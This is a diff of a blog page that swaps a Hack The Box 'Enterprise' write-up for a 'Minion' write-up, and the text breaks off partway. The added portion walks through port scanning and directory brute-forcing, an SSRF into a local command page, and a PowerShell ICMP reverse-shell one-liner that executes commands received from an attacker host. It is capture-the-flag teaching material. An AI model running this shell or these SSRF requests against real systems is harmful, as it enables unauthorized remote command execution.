@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Enterprise write-up - The Portal of Knowledge</title>
-  <meta property='og:title' content="Enterprise write-up - The Portal of Knowledge">
+  <title>Minion write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Minion write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:image" content="https://alamot.github.io/images/space.jpg">
+  <meta name="description" content="Write-up for the Minion machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Minion του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Minion machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Minion του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/minions.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/enterprise_writeup/">
+<meta property="og:url" content="https://alamot.github.io/minion_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Enterprise write-up |  ",
+    "headline": "Minion write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2018-03-19T00:00:00JST",
-    "dateModified": "2018-03-19T00:00:00JST",
+    "datePublished": "2018-04-10T00:00:00JST",
+    "dateModified": "2018-04-10T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -201,29 +201,11 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
-<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
-<ul>
-<li><a href="#port-80">Port 80</a></li>
-<li><a href="#port-443">Port 443</a></li>
-<li><a href="#port-8080">Port 8080</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a></li>
 </ul></li>
-</ul></li>
-<li><a href="#sql-injection">SQL Injection</a>
-<ul>
-<li><a href="#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
-<li><a href="#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
-</ul></li>
-<li><a href="#getting-shells">Getting shells</a>
-<ul>
-<li><a href="#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
-<li><a href="#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
-</ul></li>
-<li><a href="#privilege-escalation">Privilege escalation</a>
-<ul>
-<li><a href="#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
-<li><a href="#getting-root">Getting root</a></li>
-<li><a href="#autopwn-script">Autopwn script</a></li>
-</ul></li>
+<li><a href="#getting-shell">Getting shell</a></li>
+<li><a href="#getting-decoder">Getting decoder</a></li>
+<li><a href="#getting-admin">Getting admin</a></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -265,13 +247,13 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Enterprise write-up</h1></header>
-            <header lang="el"><h1 class="title">Ανάλυση του Enterprise</h1></header>
+            <header lang="en"><h1 id="title" class="title">Minion write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Minion</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">19 Mar 2018</time>
-            <time lang="el" class="topmargin7">19 Μαρ 2018</time>
+            <time lang="en" class="topmargin7">10 Apr 2018</time>
+            <time lang="el" class="topmargin7">10 Απρ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
               <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
@@ -286,9 +268,9 @@ if (language) {
                 <span lang="el">hackthebox</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
-                <span lang="en">windows</span>
-                <span lang="el">windows</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/bsd'>
+                <span lang="en">bsd</span>
+                <span lang="el">bsd</span>
                 </a>
             
          
@@ -301,29 +283,11 @@ if (language) {
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
-<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
-<ul>
-<li><a href="#port-80">Port 80</a></li>
-<li><a href="#port-443">Port 443</a></li>
-<li><a href="#port-8080">Port 8080</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a></li>
 </ul></li>
-</ul></li>
-<li><a href="#sql-injection">SQL Injection</a>
-<ul>
-<li><a href="#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
-<li><a href="#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
-</ul></li>
-<li><a href="#getting-shells">Getting shells</a>
-<ul>
-<li><a href="#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
-<li><a href="#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
-</ul></li>
-<li><a href="#privilege-escalation">Privilege escalation</a>
-<ul>
-<li><a href="#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
-<li><a href="#getting-root">Getting root</a></li>
-<li><a href="#autopwn-script">Autopwn script</a></li>
-</ul></li>
+<li><a href="#getting-shell">Getting shell</a></li>
+<li><a href="#getting-decoder">Getting decoder</a></li>
+<li><a href="#getting-admin">Getting admin</a></li>
 </ul>
 </nav></div>
           </section>
@@ -336,644 +300,417 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.61
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.57
 
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
+Starting masscan 1.0.4 
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65536 ports/host]
-Discovered open port 8080/tcp on 10.10.10.61                                   
-Discovered open port 443/tcp on 10.10.10.61                                    
-Discovered open port 80/tcp on 10.10.10.61                                     
-Discovered open port 22/tcp on 10.10.10.61                                     
-Discovered open port 32812/tcp on 10.10.10.61                                  
-rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5</code></pre></div></div></p>
+Discovered open port 62696/tcp on 10.10.10.57                                  
+rate:  0.00-kpps, 100.00% done, waiting 3-secs, found=1</code></pre></div></div></p>
 
-<p>We found TCP ports 22, 80, 443, 8080 and 32812 open. Let&rsquo;s explore them using nmap:</p>
+<p>We found TCP port 62696 open. Let&rsquo;s explore it using nmap:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p62696 10.10.10.57
+Starting Nmap 7.70 ( https://nmap.org ) 
+Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 100.00% done; ETC: 18:14 (0:00:00 remaining)
+Nmap scan report for 10.10.10.57
+Host is up (0.088s latency).
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
-
-Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
-Nmap scan report for 10.10.10.61
-Host is up (0.10s latency).
-
-PORT      STATE SERVICE  VERSION
-22/tcp    open  ssh      (protocol 2.0)
-| fingerprint-strings: 
-|   NULL: 
-|_    SSH-2.0-OpenSSH_7.4p1 Ubuntu-10
-| ssh-hostkey: 
-|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
-|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
-|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (EdDSA)
-80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
-|_http-generator: WordPress 4.8.1
-|_http-server-header: Apache/2.4.10 (Debian)
-|_http-title: USS Enterprise &amp;#8211; Ships Log
-443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
-|_http-title: 400 Bad Request
-| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
-| Not valid before: 2017-08-25T10:35:14
-|_Not valid after:  2017-09-24T10:35:14
-|_ssl-date: TLS randomness does not represent time
-8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
-|_http-generator: Joomla! - Open Source Content Management
-|_http-open-proxy: Proxy might be redirecting requests
-| http-robots.txt: 15 disallowed entries 
-| /joomla/administrator/ /administrator/ /bin/ /cache/ 
-| /cli/ /components/ /includes/ /installation/ /language/ 
-|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
-|_http-server-header: Apache/2.4.10 (Debian)
-|_http-title: Home
-32812/tcp open  unknown
-| fingerprint-strings: 
-|   GenericLines, GetRequest, HTTPOptions: 
-|     _______ _______ ______ _______
-|     |_____| |_____/ |______
-|     |_____ |_____ | | | _ ______|
-|     Welcome to the Library Computer Access and Retrieval System
-|     Enter Bridge Access Code: 
-|     Invalid Code
-|     Terminating Console
-|   NULL: 
-|     _______ _______ ______ _______
-|     |_____| |_____/ |______
-|     |_____ |_____ | | | _ ______|
-|     Welcome to the Library Computer Access and Retrieval System
-|_    Enter Bridge Access Code:
-2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port22-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(NULL
-SF:,20,&#34;SSH-2\.0-OpenSSH_7\.4p1\x20Ubuntu-10\n&#34;);
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port32812-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,ED,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
-SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
-SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
-SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
-SF:\x20Code:\x20\n&#34;)%r(GenericLines,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
-SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
-SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
-SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
-SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
-SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
-SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
-SF:ting\x20Console\n\n&#34;)%r(GetRequest,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
-SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
-SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
-SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
-SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
-SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
-SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
-SF:nating\x20Console\n\n&#34;)%r(HTTPOptions,110,&#34;\n\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
-SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
-SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
-SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
-SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
-SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
-SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
-SF:rminating\x20Console\n\n&#34;);
+PORT      STATE SERVICE VERSION
+62696/tcp open  http    Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 1 disallowed entry 
+|_/backend
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn&#39;t have a title (text/html).
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)</code></pre></div></div>
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012|7 (90%)
+OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional
+Aggressive OS guesses: Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 7 Professional (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-<h3 id="port-80">Port 80</h3>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u http://10.10.10.57:62696 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e asp,aspx -x 400 
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61/
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+Extensions: asp, aspx | Threads: 10 | Wordlist size: 661562
 
-START_TIME: Thu Mar 15 13:28:08 2018
-URL_BASE: http://10.10.10.61/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+Target: http://10.10.10.57:62696
 
------------------
+[19:22:48] Starting: 
+[19:22:59] 200 -   41B  - /test.asp
+[19:23:01] 200 -   20B  - /backend/
+[19:25:27] 200 -   41B  - /Test.asp
+...</code></pre></div></div>
 
-GENERATED WORDS: 4612                                                          
+<p>Let&rsquo;s explore <a href="http://10.10.10.57:62696/test.asp:" target="_blank">http://10.10.10.57:62696/test.asp:</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Missing Parameter Url [u] in GET request!</code></pre></div></p>
 
----- Scanning URL: http://10.10.10.61/ ----
-+ http://10.10.10.61/index.php (CODE:301|SIZE:0)                                                                   
-+ http://10.10.10.61/server-status (CODE:403|SIZE:299)                                                             
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/                                                                        
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/                                                                      
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/                                                                     
-+ http://10.10.10.61/xmlrpc.php (CODE:405|SIZE:42)                                                                 
+<p>Interesting. It asks for a &ldquo;u&rdquo; parameter. Maybe &ldquo;u&rdquo; means URL. Let&rsquo;s try <a href="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1" target="_blank">http://10.10.10.57:62696/test.asp?u=http://127.0.0.1</a> (i.e. localhost):
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Site Administration<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">table</span> <span class="na">border</span><span class="o">=</span><span class="s">1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Edit Configuration<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Start/Stop Instance<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Summary<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Logs<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/cmd.aspx&#34;</span><span class="p">&gt;</span>system commands<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></div></p>
 
----- Entering directory: http://10.10.10.61/wp-admin/ ----
-+ http://10.10.10.61/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/css/                                                                    
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/images/                                                                 
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/includes/                                                               
-+ http://10.10.10.61/wp-admin/index.php (CODE:302|SIZE:0)                                                          
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/js/                                                                     
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/maint/                                                                  
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/network/                                                                
-==&gt; DIRECTORY: http://10.10.10.61/wp-admin/user/                                                                   
+<p>Bingo! This &ldquo;cmd.aspx&rdquo; looks very promising&hellip; Let&rsquo;s visit <a href="http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx:" target="_blank">http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx:</a>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
 
----- Entering directory: http://10.10.10.61/wp-content/ ----
-+ http://10.10.10.61/wp-content/index.php (CODE:200|SIZE:0)                                                        
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/languages/                                                            
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/plugins/                                                              
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/themes/                                                               
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/upgrade/                                                              
-==&gt; DIRECTORY: http://10.10.10.61/wp-content/uploads/                                                              
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;cmd.aspx&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">POST</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Enter your shell command: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">text</span> <span class="na">name</span><span class="o">=</span><span class="s">xcmd</span> <span class="na">size</span><span class="o">=</span><span class="s">40</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 
----- Entering directory: http://10.10.10.61/wp-includes/ ----
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/certificates/                                                        
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/</code></pre></div></div>
-                                                         
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></div></p>
 
-<h3 id="port-443">Port 443</h3>
+<p>Hmmmm&hellip; The method is POST and the parameter is named &ldquo;xcmd&rdquo;. Nevertheless, let&rsquo;s make an experiment. We are going to use the GET method and pass the xcmd parameter via the URL. We will set the xcmd = ping -n 3 10.10.14.161:
+<a href="http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%203%2010.10.14.161" target="_blank">http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%203%2010.10.14.161</a></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb https://10.10.10.61/
+<p>On our side, let&rsquo;s see if we capture any pings coming from MINION (10.10.10.57):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+18:54:11.34867 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14290, length 40
+18:54:11.34868 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14290, length 40
+18:54:12.35746 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14301, length 40
+18:54:12.35747 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14301, length 40
+18:54:13.34309 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14310, length 40
+18:54:13.34310 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14310, length 40</code></pre></div></div>
+It&rsquo;s working! :D</p>
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+<h1 id="getting-shell">Getting shell</h1>
 
-START_TIME: Thu Mar 15 12:13:24 2018
-URL_BASE: https://10.10.10.61/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+<p>It&rsquo;s time for us to get a shell. On our side we can run icmpsh_m.py from <a href="https://github.com/inquisb/icmpsh" target="_blank">https://github.com/inquisb/icmpsh</a> and on MINION we can send this payload: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1</a>
+The problem is that if we try to send this payload via the xcmd paremeter some symbols are getting filtered (&ldquo;+&rdquo;, &ldquo;&amp;&ldquo;, &ldquo;/&rdquo;) and there is also a size limit. We can double url-encode the special symbols to pass them through. We can also use multiple &ldquo;echo &gt;&gt;&rdquo; commands to write a ps1 script file and indeed many guys followed that path. But I chose a different way. Just for fun, I wrote my own -very compact- one-liner payload without using any &ldquo;+&rdquo;,&rdquo;&amp;&rdquo; symbols:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="n">gi</span> <span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="n">iex</span> <span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span 